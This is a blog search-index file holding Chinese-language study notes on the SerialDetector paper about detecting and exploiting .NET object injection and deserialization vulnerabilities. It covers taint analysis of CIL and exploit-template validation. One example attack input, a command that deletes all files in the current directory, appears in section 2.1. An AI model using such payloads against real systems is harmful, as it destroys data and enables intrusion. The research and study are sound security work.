<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>论文笔记——SerialDetector: Principled and Practical Exploration of Object Injection Vulnerabilities for the Web</title>
    <url>/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/</url>
    <content><![CDATA[<p>时隔三年，继续更新！！！！</p>
<a id="more"></a>

<p>论文题目：SerialDetector: Principled and Practical Exploration of Object Injection Vulnerabilities for the Web</p>
<p>论文出处：NDSS 2021</p>
<p>论文作者：Mikhail Shcherbakov(KTH Royal Institute of Technology)，Musard Balliu(KTH Royal Institute of Technology)     </p>
<p><a href="https://www.ndss-symposium.org/wp-content/uploads/ndss2021_3A-5_24550_paper.pdf" target="_blank" rel="noopener">论文下载地址</a></p>
<p><a href="https://www.youtube.com/watch?v=s55zxjEIvE4&list=PLfUWWM-POgQtcueMu_QOh87jWB6r5MeRm&index=5" target="_blank" rel="noopener">会议视频地址</a></p>
<h2 id="0x01-Abstract-amp-Introduction"><a href="#0x01-Abstract-amp-Introduction" class="headerlink" title="0x01 Abstract &amp; Introduction"></a>0x01 Abstract &amp; Introduction</h2><p>​        对象注入漏洞(OIV)允许攻击者控制的数据滥用Web应用代码库中的合法代码片段来执行一个代码链（gadget），攻击者利用这个代码链执行恶意行为，如RCE。当使用不受信任的数据实例化攻击者控制类型的对象，而且这个对象的属性攻击者可以选择时，就会发生OIV，从而触发恶意行为。</p>
<p>​        论文第一个提出了针对包含框架和库的.NET语言应用的OIV漏洞的系统检测和利用方法。作者认为OIV漏洞的根本原因是不受信任的信息流从Web应用公共入口流到可以创建任意类型的对象的敏感函数去调用触发gadget执行的方法。</p>
<ol>
<li>作者基于污点的数据流分析方法实现了自动化挖掘.NET程序集中的OIV模式；</li>
<li>使用这些模式自动匹配公开可用的gadget并验证OIV攻击的可用性；</li>
<li>用该方法对复杂的生产级应用进行实验，如微软的Azure DevOps Server；</li>
<li>描述针对Azure DevOps Server的威胁模型。</li>
</ol>
<p>挑战：</p>
<ol>
<li>对OIV核心语言特征的全面理解尚未出现;</li>
<li>类似.Net这种生产级别的框架，具有大量代码库复杂的实体、复杂的语言特性以及缺乏源代码；</li>
<li>缺乏一个自动化和开源的工具调查潜在攻击的可行性。</li>
</ol>
<p>贡献：</p>
<ol>
<li>识别了对象注入漏洞的根本原因，提出了原则而且实际的与框架无关的方法；</li>
<li>提出了第一个系统的检测和利用包含框架和库的.NET应用反序列化漏洞的方法；</li>
<li>开源了SerialDetector,实现了可扩展的基于污点的数据流分析挖掘OIV模式和利用公开可用的gadgets利用真实软件中的OIV；</li>
<li>进行一个彻底的评估，展示SerialDetector可以在安全分析中低负担地发现漏洞模式；</li>
<li>对Azure DevOps Server进行了深入的安全分析，解释了不同的威胁模型，借鉴这些威胁模型，展示了SeiralDetector识别和利用高危漏洞导致服务器远程代码执行。</li>
</ol>
<h2 id="0x02-Technical-Background"><a href="#0x02-Technical-Background" class="headerlink" title="0x02 Technical Background"></a>0x02 Technical Background</h2><h3 id="2-1-应用层OIVs"><a href="#2-1-应用层OIVs" class="headerlink" title="2.1 应用层OIVs"></a>2.1 应用层OIVs</h3><p>​        应用层OIVs包括如下要素：(1)一个允许攻击者注入不受信任数据的公共入口点；(2)一个可以创建攻击者可控类型对象的敏感函数；(3)一个由最终执行危险操作的方法调用链组成的gadget。示例如下面两张图，</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230404220003256.png" alt="image-20230404220003256"></p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230404220020037.png" alt="image-20230404220020037"></p>
<p>攻击者构造<code>name = OSCommand &amp; args = del /q *</code>，最后会导致远程代码执行，删除当前目录的所有文件。</p>
<p>​        对于这类漏洞的检测，需要全面地分析考虑实现IOcomand接口的类中Excute方法的所有实现。</p>
<h3 id="2-2-基础架构层OIVs"><a href="#2-2-基础架构层OIVs" class="headerlink" title="2.2 基础架构层OIVs"></a>2.2 基础架构层OIVs</h3><p>​        在基础架构层的OIV的一个主要例子是不安全的反序列化，序列化是面向对象语言用来存储和传输对象的机制，可以将对象转换成字节流的形式存储或传输，反序列化与之相反，是从字节流中重新创建对象原始状态的过程。不安全的反序列化中的OIVs如下图实例：</p>
<p>​        下图表示使用YamlDotNet反序列化yaml参数的代码片段，Deserialeze函数是一个公开入口点（public entry point）,可能从HTTP请求参数、cookie、文件上传收到数据，之后递归调用DeserializeObject创建指定类型的对象并设置它的字段属性值。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230405193659345.png" alt="image-20230405193659345"></p>
<p>​        下图为ObjectDataProvider类的代码片段，对象的属性<code>setter</code> <code>ObjectInstance</code>调用<code>Refresh</code>，会调用<code>MethodName</code>指定的方法，所以一旦攻击者控制了<code>ObjectDataProvider.MethodName</code>和<code>ObjectDataProvider.ObjectInstance</code>，就可以执行任意方法。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230405193723811.png" alt="image-20230405193723811"></p>
<p>​        攻击者用如下的payload即可实现执行计算器。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230405220733214.png" alt="image-20230405220733214"></p>
<p>​        上述漏洞同样包括应用级OIV的3个要素：（1）公开入口点，（2）调用可以创建任意类型对象的敏感函数，（3）后续，恶意gadget的执行（属性的<code>setter</code>）。为了检测这类漏洞，应考虑属性<code>setter</code>方法的所有实现，如.NET框架库中的<code>SetValue</code></p>
<h2 id="0x03-Overview-of-the-approach"><a href="#0x03-Overview-of-the-approach" class="headerlink" title="0x03 Overview of the approach"></a>0x03 Overview of the approach</h2><h3 id="3-1-分析对象注入漏洞的根本原因"><a href="#3-1-分析对象注入漏洞的根本原因" class="headerlink" title="3.1 分析对象注入漏洞的根本原因"></a>3.1 分析对象注入漏洞的根本原因</h3><ul>
<li><p>公共的入口点(public entry points)：</p>
</li>
<li><p>敏感Sink(sensitive sinks)：RuntimeTypeHandle.Allocate()，方法以输入的<code>type</code>作为参数，并返回<code>type</code>类型定义的对象;</p>
</li>
<li><p>攻击触发器(attack triggers)：RuntimeMethodHandle.InvokeMethod()，能够决定导致恶意行为Gadget链第一个方法的方法；</p>
</li>
</ul>
<p>​        作者使用这三个因素作为OIV模式（OIV patterns）：一个公共入口点会触发敏感接收器的执行，以创建一个控制攻击触发器执行的对象，下图为OIV模式的一个例子：</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230317160626713.png" alt="image-20230317160626713"></p>
<p>研究问题：</p>
<p>(i)：识别OIV的适当标准是什么？</p>
<p>(ii)：我们能否提供一个工具可以在大规模包括框架和库的应用中检查OIV模式？</p>
<p>(iii)：我们如何验生成的OIV模式的有效性？</p>
<p>(iv)：是否有现实世界的应用来证明这种方法的可行性？</p>
<h3 id="3-2-SerialDetector"><a href="#3-2-SerialDetector" class="headerlink" title="3.2 SerialDetector"></a>3.2 SerialDetector</h3><p>​      SerialDetector的整体架构如下图，分为检测（全自动）和利用（半自动）两个阶段，对应的输入和输出在图中很清晰。  </p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230405222722597.png" alt="image-20230405222722597"></p>
<h4 id="（1）静态分析"><a href="#（1）静态分析" class="headerlink" title="（1）静态分析"></a>（1）静态分析</h4><p>目标针对Commom Intermediate Language的原因：</p>
<p>(i)：旨在分析 .NET Framework 的代码以识别敏感方法，在源代码级别是不可用的；？？？</p>
<p>(ii)：这个方法允许我们实现框架无关的分析方法，不需要任何框架的已知漏洞知识。</p>
<p>(iii)：旨在针对真实生产级应用进行深入安全评测，比如微软的Azure DevOps，它们的源码都是不可用的。</p>
<p>(iv)：对比高级语言，分析CIL需要更少的必须支持的语言构造。</p>
<p>​        关注CIL不会失去任何代码分析中重要的数据，另一方面，CIL 继承了分析基于堆栈的面向对象中间语言所面临的众所周知的挑战，例如对求值栈的仿真和控制流的重构。这种分析的核心是基于方法摘要、指针别名和高效的即时控制流图重构的模块化过程间抽象解释。该分析实现了<strong>类型敏感</strong>、一个轻量级的<strong>上下文敏感</strong>以及<strong>类型层次结构图分析</strong>，用于重构调用图。</p>
<h4 id="（2）结果路线图"><a href="#（2）结果路线图" class="headerlink" title="（2）结果路线图"></a>（2）结果路线图</h4><p>​        因为攻击触发器是 gadget 中的第一个方法，所以我们生成的模式中的攻击触发器只需与 gadget 的第一个方法匹配即可。</p>
<h2 id="0x04-Taint-Based-Static-Analysis"><a href="#0x04-Taint-Based-Static-Analysis" class="headerlink" title="0x04 Taint-Based Static Analysis"></a>0x04 Taint-Based Static Analysis</h2><p>​       这节提出了基于污点的静态分析方法支撑SerialDetector的检测部分，分析针对CIL，一个面向对象的基于栈的二进制指令集，该方法采用模块化的过程间<strong>字段敏感（field-sensitive）</strong>的数据流分析。</p>
<h3 id="4-1-CIL语言和符号"><a href="#4-1-CIL语言和符号" class="headerlink" title="4.1 CIL语言和符号"></a>4.1 CIL语言和符号</h3><p>关注如下的指令集，描述分析方法的核心思想。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406154506898.png" alt="image-20230406154506898"></p>
<blockquote>
<p><strong>“ldvar”</strong> 可能指的是 IL (Intermediate Language) 中的 “load local variable”，即加载本地变量的指令。在 CIL 中，本地变量是在方法中定义的变量，它们只在方法中有效。 “ldvar” 指令用于将本地变量的值加载到执行堆栈上，以供后续指令使用。该指令具有不同的操作码，具体取决于本地变量的类型和位置。</p>
<p><strong>“ldfld”</strong> 是 CIL (Common Intermediate Language) 中的一条指令，用于将对象的字段值加载到执行堆栈上。它需要两个参数：第一个参数是对象引用，第二个参数是字段的元数据标记。这个指令是用于访问一个对象的实例字段的。</p>
<p>例如，如果有一个名为 “myObject” 的对象实例，它有一个名为 “myField” 的 int 类型字段，那么可以使用以下 C# 代码访问该字段：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">arduinoCopy code</span><br><span class="line"><span class="keyword">int</span> x = myObject.myField;</span><br></pre></td></tr></table></figure>

<p>在 CIL 中，该代码将被转换为以下指令序列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arduinoCopy codeldarg.0 &#x2F;&#x2F; 加载 this 对象的引用</span><br><span class="line">ldfld int32 Namespace.MyClass::myField &#x2F;&#x2F; 加载字段的值</span><br></pre></td></tr></table></figure>

<p>其中 “ldarg.0” 指令用于加载当前方法的 this 指针，它是一个指向对象实例的引用。 “ldfld” 指令使用元数据标记来确定要加载的字段。</p>
<p><strong><code>stvar</code></strong> 是 CIL 语言中的指令之一，用于将值存储到指定变量中。其操作数指定了要存储的变量的索引，该变量必须在先前定义的变量列表中。以下是一个示例代码片段，展示了如何使用 <code>stvar</code> 指令将值存储到变量中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">swiftCopy code.locals init (int32 V_0)</span><br><span class="line">ldc.i4.5</span><br><span class="line">stvar V_0</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>.locals</code> 指令声明了一个名为 <code>V_0</code> 的整型变量。<code>ldc.i4.5</code> 将整数值 5 推送到操作数栈上，然后 <code>stvar V_0</code> 将该值存储到 <code>V_0</code> 变量中。</p>
<p>……</p>
</blockquote>
<p>​        作者假设了变量集合<code>Var</code>（包含函数形参、本地变量等）、对象字段集合<code>Fld</code>、值集合<code>Val</code>（对象位置location和其他值bool true\bool false）、类类型集合<code>Types</code>。用 f[x → v] 表示将值 v 替换函数 f 中的参数 x，f(x) 表示函数 f 中 x 的值使用 f(x)↓ 来表示<strong>偏函数</strong> f 在 x 处定义，否则为 f(x)↑。使用 (b ? e1 : e2) 表示一个条件表达式，如果条件 b 为真，则返回 e1，否则返回 e2。</p>
<p>​        内存模型包含一个环境<strong>E</strong>: Var→Val，映射变量到值、一个堆<strong>h</strong>:Loc x Fld → Val，映射对象位置和字段到值，一个操作栈<strong>s</strong>和一个调用栈<strong>cs</strong>。E和h都是偏函数，<em>⊥</em> 表示未定义的值。程序P<em>∈</em> Prog 由指令列表组成，由程序计数器pc索引表示，i<em>∈</em> PC。作者默认一个类的定义包含一组字段、一组方法，以及一组启动执行的不同的方法。每个方法包含一个带有形参的函数标识符和执行列表。sig<em>∈</em> <em>Sig</em> ,sig为由函数名和形参组成的函数签名。</p>
<p>​        执行模型由cfg<em>∈</em> CFG组成，cfg形如cfg=(pc,cs,E,h,s)包含程序计数器pc<em>∈</em>PC，环境E<em>∈</em> ENV，堆h<em>∈</em> Heap，调用栈 cs = (pc,E,s)* ,cs<em>∈</em>  (<em>PC</em> <em>×</em> <em>Env</em> <em>×</em> <em>Val</em> * ) *，操作栈s<em>∈</em> Val*。</p>
<p>​         希腊字母e表示空栈， t::v表示栈的顶部是v，尾部是t。CIL程序中的语义由cfg上的转换关系<em>→</em>定义，→∈ <em>Conf</em> ×Conf</p>
<p>下图为CIL的操作语义：</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406170327323.png" alt="image-20230406170327323"></p>
<h3 id="4-2-过程内数据流分析"><a href="#4-2-过程内数据流分析" class="headerlink" title="4.2 过程内数据流分析"></a>4.2 过程内数据流分析</h3><p>​        作者的抽象解释高估了原始类型的操作，关注对象位置从敏感sink到攻击触发器的传播。作者对CIL指令的抽象解释利用了对象位置值和其他原始值的符号域。&lt;pc,E,h,s,$\phi$,$\psi$&gt;，前四个对应具体的组件，$\phi$过估计符号栈,$\psi$过估计控制流。</p>
<h4 id="〇挑战和解决方案"><a href="#〇挑战和解决方案" class="headerlink" title="〇挑战和解决方案"></a>〇挑战和解决方案</h4><p>挑战：</p>
<ul>
<li>堆的抽象表示</li>
<li>非结构化的控制流和栈的符号表示（缺乏结构和跨不同分支保存符号堆栈的一致性）</li>
<li>控制流的完备性（sound approximation）</li>
</ul>
<p>解决方法：</p>
<p>​        作者使用基于存储的堆抽象和通过正向符号分析对条件和循环的合并点的有效动态计算来解决这些挑战。作者的分析方法是<strong>流不敏感</strong>的，因此抽象堆图和关于别名的信息存在于方法中的任何程序点上。 通过记录每个分支指令的堆栈状态，并组合合并点上的堆栈，同时更新堆栈和环境中的指针，从而确保了符号堆栈的一致性。</p>
<h4 id="①抽象堆"><a href="#①抽象堆" class="headerlink" title="①抽象堆"></a>①抽象堆</h4><p>​        节点表示抽象位置，边表示指向关系，包含<strong>字段和变量</strong>对应的标签。堆的抽象表示如下图，规则S-LDVAR、S-LDFLD和S-NEWOBJ（未显示）类似于图12中相应的规则，但对符号值进行操作，并忽略调用堆栈cs。规则S-STVAR和S-STFLD依赖于一个update函数来实现<strong>流不敏感</strong>和<strong>字段敏感</strong>的抽象语义。update函数以两个lication作为输入，会合并根节点在那些locations的子图，这个方法是流不敏感的，因为它使用新的符号值更新符号配置，而不是重新变量字段的旧值。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406211143738.png" alt="image-20230406211143738"></p>
<p>以下面的代码为例，第四行代码对应右边3行CIL，</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406212337079.png" alt="image-20230406212337079"></p>
<p>分析完前三行代码可以得到下图左侧的堆图，当分析第四条指令即对应的4a-4c，合并la（E(arg)=la）和lb（栈顶是lb），得到下图右侧图。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406212622434.png" alt="image-20230406212622434"></p>
<h4 id="②抽象控制流"><a href="#②抽象控制流" class="headerlink" title="②抽象控制流"></a>②抽象控制流</h4><p>​        按照程序计数器pc施加的程序顺序“顺序”分析指令(1234,不考虑跳转，按顺序分析)，并确保符号栈和堆的动态一致性。用两个数据结构扩展了符号配置，<strong>一个函数$\phi$： PC→℘(Stack)，映射程序计数器索引到栈集合，来记录控制流分支合并点的符号栈；一个程序计数器索引集$\psi$<em>⊆</em> ℘(PC)来记录与循环相关联的向后跳转（backward jumps），用来确保循环不被重复分析，（这两个符号后面多次使用）</strong>当一个非条件跳转被分析，pc<em>∈</em> <em>$\psi$<em>，设置当前栈为⊥，继续分析下一条指令，一个未定义的堆栈将简单用规则S-STSKIP跳过当前指令的分析。因为这种分析是*</em>流和路径不敏感*<em>的，所以一个代码块分析一次是足够的。下图解释控制流指令分析算法，使用函数</em>mergeStacks</em> : <em>℘</em>(<em>Stack</em>) <em>×</em> <em>Heap</em> <em>×</em> <em>Env</em> <em>×</em> Φ <em>→</em> <em>Stack</em> <em>×</em> <em>Heap</em> <em>×</em> <em>Env</em> <em>×</em> Φ合并所有栈并且更新符号配置。<em>mergeStacks</em>逐点合并符号位置，并更新指向其他组件中合并位置的指针。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406215720048.png" alt="image-20230406215720048"></p>
<p>考虑如下的代码，分析第5行<code>br 7</code>时，为了$\phi$(7)，存储包含arg和var2的函数栈，当分析到第7行<code>stfld obj</code>时，应用S-STUPD规则合并$\phi$(7)和当前的符号栈（包含arg和var1），然后S-STFLD确保字段arg.obj包含合并后的location。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406220225999.png" alt="image-20230406220225999"></p>
<p>​        还需考虑由向后跳转指令产生的潜在循环。如下图的代码，分析第一条指令时，基于S-BRFWD规则将当前符号栈存储在$\phi$(15)中，并将栈更新为未定义，这是因为不知道是否会从另一个配置中到达索引（2）处的下一条指令。因此直到下一个合并点（如对应的$\phi$(pc)是被定义过的）都利用规则S-STSKIP简单地跳过。然后使用规则S-STUPD合并$\phi$(15)和未定义的符号栈，之后加载flag变量到栈，并通过规则S-BRTRUEBWD在索引16处检查指令<code>brture 2</code>，这里对应上上图中i&lt;pc的情况，因为pc<em>∈</em> <em>$\psi$</em> ,将控制转换到索引为2的代码行去分析循环体，当再次分析到<code>brture 2</code>时，因为已经分析过，即16<em>∈</em> <em>$\psi$</em>  ，所以继续分析下一条指令（索引为17的指令）。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230406230306346.png" alt="image-20230406230306346"></p>
<h4 id="③假名和污点跟踪"><a href="#③假名和污点跟踪" class="headerlink" title="③假名和污点跟踪"></a>③假名和污点跟踪</h4><p>​        为了分析从敏感sink到攻击触发器的信息流，在抽象堆图的节点中丰富加了taint标记。如下图，无论什么时候分析完敏感sink后，将返回值放入栈标记为taint，然后为b.bar这个假名添加边，最终分析第三行得到b.bar是tainted的，因此，控制其类型的攻击者决定了执行VirtualCall()的具体实现。因此，我们认为这种方法是一种潜在的攻击触发器。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407102651398.png" alt="image-20230407102651398"></p>
<h3 id="4-3模块化数据流分析"><a href="#4-3模块化数据流分析" class="headerlink" title="4.3模块化数据流分析"></a>4.3模块化数据流分析</h3><h4 id="①调用图分析"><a href="#①调用图分析" class="headerlink" title="①调用图分析"></a>①调用图分析</h4><p>​        从CIL程序集中识别与调用和调用命令指令关联的方法签名，并存储在hash表中，签名作为键，调用的函数作为值。这个hash表就是调用图的一个表示。通过backward analysis，可以重构调用图。从sink到point可以计算O(n),n表示调用栈的深度。计算类型层次图来确定虚拟方法调用的所有实现。作者假设一个基本方法的虚拟调用可以将控制转移到该方法的任何实现中，并将这些信息存储在调用图中。分析器在将调用图从一个敏感的接收器到入口点的反向重建期间，以及在callvirt指令的抽象解释期间使用这些信息。</p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201021152130463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nOTcxMTA1,size_16,color_FFFFFF,t_70#pic_center" alt="前向传播与反向传播"></p>
</blockquote>
<h4 id="②使用函数摘要的过程间分析"><a href="#②使用函数摘要的过程间分析" class="headerlink" title="②使用函数摘要的过程间分析"></a>②使用函数摘要的过程间分析</h4><p>​        在初步确定的每个<strong>入口点</strong>（可能是函数的入口点）进行一个模块化数据流分析，在任何分析到达新方法，独立于调用者的上下文来分析该方法，因此，它生成了一个称为摘要的堆图的紧凑表示。然后将摘要存储到缓存结构K中，并为对相同方法的后续调用重用它。</p>
<p>​        使用下面的符号描述方法调用的抽象表示，state <em>σ</em> <em>∈</em> <em>State</em> ，σ是一个元组(<em>E, h, s, $\phi$, $\psi$</em>) ，无论什么时候分析一个新方法时，都存储它。</p>
<p>​        符号调用堆栈cs <em>∈</em> (<em>State</em> <em>×</em> <em>PC</em> ) *是一个（σ，pc）对的堆栈，包含调用者的状态和状态σ中的程序计数器索引。</p>
<p>​        偏函数K：Sig → Sum 缓存每个方法签名的方法摘要，方法摘要 sum ∈ Sum 是由环境E和堆h组成的元组（E，h）定义的。</p>
<p>​        下图对应基于基于摘要的过程间分析方法的四种案例：S-CALLK：调用缓存K中已有对应摘要的函数，apply摘要（包含形参和返回值等）和当前的state，得到新状态；S-CALLEXT：调用到外部/本地方法，但没有实现可用，；S-CALL：调用到在缓存K中没有摘要的（非递归）方法，通过将控制转移到索引pc0的代码，并将调用者的上下文（调用者状态和程序计数器索引）存储在符号堆栈的cs中，从而触发对新方法的过程内分析，<strong>被调用方法的分析是上下文独立的</strong>，σ是未定义的，匹配S-END计算该方法终止时的过程内分析摘要，后续将摘要apply于调用者的上下文，并将摘要存储到K中。继续下一个指令的分析；S-END:在一个方法的分析终止时，更新缓存K.</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407105459332.png" alt="image-20230407105459332"></p>
<h4 id="③例子：方法调用"><a href="#③例子：方法调用" class="headerlink" title="③例子：方法调用"></a>③例子：方法调用</h4><p>​        用下图左侧代码说明非递归调用的抽象解释，从Epoint方法开始分析，并调用SSink这个外部方法，规则S-CALLEXT分配一个新的位置，并将其推到堆栈中，以模拟返回值。因为方法签名被定义为敏感sink，所以我们将新变量标记为tainted。随后，分配值将受污染的值存储到b.foo中的位置。接下来，调用方法CreateAlias，它在将当前的σ和pc存储到调用堆栈后，通过规则S-CALL触发对其主体的过程内分析。该分析应用规则S-STFLD来在arg.bar和arg.foo之间创建一个别名。最后，规则S-END从当前符号状态构建摘要并把它存入缓存。摘要生成算法从E中的根变量Var开始遍历堆图h，并存储已访问的节点和对摘要的引用。这是唯一可能影响调用者上下文的信息。随后，该算法将摘要应用于调用者的状态，以创建一个考虑方法调用效果的新状态，并继续执行方法EPoint的下一条指令。图8b描述了摘要应用程序的效果，它们将带有bar标签的边添加到堆图中，从而导致这两个字段指向被污染的节点。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407194307308.png" alt="image-20230407194307308"></p>
<p>​        最后，通过规则S-CALL分析了Foo方法。Foo包含一个以参数arg作为参数的外部方法调用（由规则S-CALLEXT分析）。由于ExternalMethod可以用作攻击触发器，因此作者将有关ExternalMethod的信息存储在arg位置的节点中。规则S-END构建并存储摘要，并在到达方法的结束时将其应用于EPoint上下文。因此，我们合并两个位置（传递给Foo的b.bar和摘要中的arg），并检测对带有污染标记的攻击触发器的调用。最后，作者将从EPoint到SSink和ExternalMethod的链存储为OIV模式。</p>
<h2 id="0x05-Implementation"><a href="#0x05-Implementation" class="headerlink" title="0x05 Implementation"></a>0x05 Implementation</h2><h3 id="5-1-剖析SerialDetector"><a href="#5-1-剖析SerialDetector" class="headerlink" title="5.1 剖析SerialDetector"></a>5.1 剖析SerialDetector</h3><p>​        使用C#语言开发，运行在.NET平台，使用dnlib库解析程序集。</p>
<h4 id="①检测阶段"><a href="#①检测阶段" class="headerlink" title="①检测阶段"></a>①检测阶段</h4><p>​        序列检测器的显著特点是，它实现了与框架无关的范式，并且不使用任何基于方法或类名的启发式方法来检测OIV模式。输入由一组的.NET程序集、针对敏感的接收器和攻击触发器的规则组成。敏感sink最初被描述为返回System.Object类型对象的本机方法。因此，我们假设攻击者可以操作敏感sink的参数或运行时状态，以获得任意类型的对象。SerialDetector只分析.NET程序集中的CIL代码，并且不支持本地方法中的二进制代码。因此，我们采用一种保守的方法，即每个本机方法都返回一个任何派生类型的对象作为返回类型。然后，我们将敏感sink的返回对象标记为tainted。攻击触发器被描述为将受污染对象作为参数的本地（外部）方法，或者将第一个参数标记为受污染对象的虚拟方法。</p>
<p>​        检测阶段的管道由四个步骤组成：</p>
<ol>
<li>序列检测器为整个.NET程序集数据集建立一个方法调用图的索引；</li>
<li>它使用定义敏感接收器的标准过滤所有本机方法签名。这一步产生敏感sink的签名，我们使用它来向后构建调用图的切片，从敏感sink到入口点方法；</li>
<li>如第四节所述，序列检测器执行基于摘要的过程间的数据流分析；</li>
<li>它输出一系列模式，其中包含调用每个敏感sink的触发器以及从入口点到敏感sink的轨迹。收集这些模式到一个知识库中，并将它们作为利用阶段的输入。</li>
</ol>
<h4 id="②利用生成和验证"><a href="#②利用生成和验证" class="headerlink" title="②利用生成和验证"></a>②利用生成和验证</h4><p>​         通过先前得到的知识库，手动识别框架和库中漏洞模式的用法。为此，作者使用YSoSerial.Net项目创建利用目标应用程序漏洞的模板。我们通过使用类似于DSL的API直接在C#代码中声明每个公共脆弱方法的签名来实现这一点。下图对应2.2节示例漏洞的利用模板。</p>
<p><img src="/2023/04/04/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94SerialDetector-Principled-and-Practical-Exploration-of-Object-Injection-Vulnerabilities-for-the-Web/image-20230407205402084.png" alt="image-20230407205402084"></p>
<p>​        使用DSL生成模板有便于修改和测试不同载荷的优点。</p>
<ol>
<li>匹配：手动将生成的模式与已知gadget的真实敏感sink和攻击触发器匹配；</li>
<li>填充知识库：用匹配的结果填充知识库，描述了一个用于创建和转换为各种格式以生成有效负载的小工具的代码，还描述了来自模板中匹配模式的脆弱入口点的签名，以及额外的限制，例如，脆弱库的版本。</li>
<li>payload和模板生成：基于描述的知识库规则生成payload和模板；</li>
<li>调用图分析：使用模板作为调用图分析的输入，以检测目标应用程序中潜在的脆弱模板。SerialDetector从应用程序入口点到模板中描述的脆弱调用生成调用图；</li>
<li>模板验证：它可以验证给定的有效负载是否可以利用模板中的一个入口点。它还使用模板描述作为编译带有漏洞代码.NET程序集的源来验证调用图分析步骤。它对这个示例运行分析。测试所需的所有信息都是从知识库中提取的；</li>
<li>利用生成：human-in-the-loop</li>
</ol>
